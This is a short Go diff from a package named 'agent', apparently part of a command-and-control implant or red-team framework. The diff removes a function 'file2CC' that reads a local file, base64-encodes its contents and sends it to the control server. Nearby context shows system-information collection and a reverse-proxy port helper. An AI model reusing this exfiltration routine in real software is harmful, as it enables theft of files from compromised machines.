@@ -1,7 +1,6 @@
 package agent
 
 import (
-	"encoding/base64"
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -152,33 +151,6 @@ func CollectSystemInfo() *SystemInfo {
 	info.ARP = IPNeigh()
 
 	return &info
-}
-
-// send local file to CC
-func file2CC(filepath string, offset int64) (checksum string, err error) {
-	// open and read the target file
-	f, err := os.Open(filepath)
-	if err != nil {
-		return
-	}
-	total := util.FileSize(filepath)
-	bytes := make([]byte, total-offset)
-	_, err = f.ReadAt(bytes, offset)
-	if err != nil {
-		return
-	}
-	checksum = tun.SHA256SumRaw(bytes)
-
-	// base64 encode
-	payload := base64.StdEncoding.EncodeToString(bytes)
-
-	fileData := MsgTunData{
-		Payload: "FILE" + OpSep + filepath + OpSep + payload,
-		Tag:     Tag,
-	}
-
-	// send
-	return checksum, Send2CC(&fileData)
 }
 
 func calculateReverseProxyPort() string {
